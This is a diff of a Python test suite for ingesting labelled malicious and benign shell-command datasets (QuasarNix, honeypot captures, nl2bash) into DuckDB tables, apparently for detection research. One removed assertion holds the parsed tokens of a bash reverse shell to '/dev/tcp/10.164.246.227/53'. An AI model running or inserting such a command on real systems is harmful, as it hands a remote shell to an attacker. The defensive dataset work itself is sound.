@@ -37,10 +37,10 @@ def test_quasarnix_release_excerpts(tmp_path):
     second = _ingest(root, '_ingest_quasarnix', db)
     assert json.loads(second.stdout)['skipped']
     with duckdb.connect(str(db)) as con:
-        assert con.execute("SELECT label,count(*) FROM COMMANDS GROUP BY label ORDER BY label").fetchall() == [('malicious', 4), ('benign', 4)]
-        assert con.execute("SELECT args,other_tokens FROM COMMANDS WHERE record_id='X_train_malicious_cmd_orig.json:0:0'").fetchone() == (['-i'], ['>&', '/dev/tcp/10.164.246.227/53', '0', '>&', '1'])
-        assert con.execute("SELECT shell_input FROM COMMANDS WHERE record_id='nl2bash.json:0:0'").fetchone() == ('find . -name \\!',)
-        assert con.execute('SELECT count(DISTINCT session_id), count(*) FROM COMMANDS').fetchone() == (8, 8)
+        assert con.execute("SELECT dataset_label,count(*) FROM PROCESS_LAUNCHES GROUP BY dataset_label ORDER BY dataset_label").fetchall() == [('malicious', 4), ('benign', 4)]
+        assert con.execute("SELECT args FROM PROCESS_LAUNCHES WHERE record_id='X_train_malicious_cmd_orig.json:0:0'").fetchone() == (['-i'],)
+        assert con.execute("SELECT shell_input FROM SHELL_INPUTS WHERE record_id='nl2bash.json:0'").fetchone() == ('find . -name \\!',)
+        assert con.execute('SELECT count(DISTINCT session_id), count(*) FROM PROCESS_LAUNCHES').fetchone() == (8, 8)
 
 
 def _archive(root, files):
@@ -73,7 +73,7 @@ def test_honeypot_occurrences_connections_and_responses(tmp_path):
     result = _ingest(root, '_ingest_shell_honeypot', db)
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(db)) as con:
-        rows = con.execute('SELECT pgm,args,label,group_id,session_id FROM COMMANDS ORDER BY record_id').fetchall()
+        rows = con.execute('SELECT pgm,args,dataset_label,group_id,session_id FROM PROCESS_LAUNCHES ORDER BY record_id').fetchall()
         assert len(rows) == 4, 'Raw coverage may only suppress matching cleaned occurrences, including multiplicity'
         assert {r[0] for r in rows} == {'uname', 'id'}, 'Responses must never become commands'
         assert all(r[2] == 'malicious-group' for r in rows), 'Severity zero is not a benign annotation'
@@ -98,7 +98,7 @@ def test_honeypot_complete_capture_formats(tmp_path):
     result = _ingest(root, '_ingest_shell_honeypot', db)
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(db)) as con:
-        assert con.execute('SELECT pgm,args,shell_input FROM COMMANDS ORDER BY record_id').fetchall() == [
+        assert con.execute("SELECT pgm,args,shell_input FROM PROCESS_LAUNCHES p JOIN SHELL_INPUTS s ON starts_with(p.record_id, s.record_id || ':') ORDER BY p.record_id").fetchall() == [
             ('uname', ['-s', '-v', '-n', '-r', '-m'], 'uname -s -v -n -r -m '),
             ('uname', ['-s', '-v', '-n', '-r', '-m'], 'uname -s -v -n -r -m')], 'Read original input once; process echoes must not duplicate it'
 
@@ -116,7 +116,7 @@ def test_quasarnix_padding_mentions_socket(tmp_path):
     result = _ingest(root, '_ingest_quasarnix', db)
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(db)) as con:
-        assert con.execute('SELECT pgm,label FROM COMMANDS ORDER BY record_id').fetchall() == [
+        assert con.execute('SELECT pgm,dataset_label FROM PROCESS_LAUNCHES ORDER BY record_id').fetchall() == [
             ('echo', 'malicious-group'), ('cat', 'malicious-group'), ('bash', 'malicious')]
 
 
@@ -171,8 +171,8 @@ def test_quasarnix_ansi_c_nul_arguments(tmp_path):
     assert result.returncode == 0, result.stderr
     with duckdb.connect(str(db)) as con:
         rows = dict(con.execute(
-            'SELECT record_id, struct_pack(pgm := pgm, args := args, '
-            'shell_input := shell_input, label := label) FROM COMMANDS'
+            'SELECT p.record_id, struct_pack(pgm := pgm, args := args, '
+            "shell_input := shell_input, label := p.dataset_label) FROM PROCESS_LAUNCHES p JOIN SHELL_INPUTS s ON starts_with(p.record_id, s.record_id || ':')"
         ).fetchall())
     assert len(rows) == len(commands), 'ANSI-C words must not drop or duplicate commands'
     for index, (_, expected) in enumerate(cases):
